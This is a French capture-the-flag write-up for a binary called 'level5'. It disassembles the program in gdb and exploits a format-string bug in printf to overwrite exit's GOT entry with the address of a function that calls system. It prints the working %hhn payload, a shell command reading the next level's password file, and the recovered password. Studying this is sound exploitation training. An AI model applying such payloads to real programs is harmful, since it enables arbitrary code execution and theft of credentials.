# Level5

On observe un executable a la racine `level5`

```bash
$ ./level5
Hello World
Hello World
```

On cherche donc a comprendre ce que fait l'executable

```bash
$ gdb level5 -q
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   ebp
   0x08048505 <+1>:     mov    ebp,esp
   0x08048507 <+3>:     and    esp,0xfffffff0
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:     mov    eax,ds:0x8049848
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:    lea    eax,[ebp-0x208]
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    eax,[ebp-0x208]
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.

```

On va utiliser `Cutter` pour avoir un idee plus clair de `level5`

```bash
$ scp -P 4242 -r level5@192.168.56.102:/home/user/level5/level5 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage level5
```

_resultat sauvegarde dans [source.md](source.md)_

Notre objectif ici est de modifier la valeur a l'adresse `0x08049838` d'exit sur `got` par l'adresse de la fonction `o`.
Actuellement `o` n'est pas appeler

On cherche donc a passer de `0x08049838 => 0x080484a4`. Il n'y a que les 2 derniers octects a modifier

A l'adresse `\x39\x98\x04\x08`, nous allons enregistrer <code>84<sub>16</sub>=132<sub>10</sub></code>
Et a l'adresse `\x38\x98\x04\x08`, nous allons enregistrer <code>a4<sub>16</sub>=164<sub>10</sub></code>

```bash
$ (python -c 'print "\x39\x98\x04\x08\x38\x98\x04\x08%124d%4$hhn%32d%5$hhn"'; cat) | ./level5
98
                                            512                     -1208149312
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
Ctrl+D

level5:$ su level6
Password:

level6:$
```
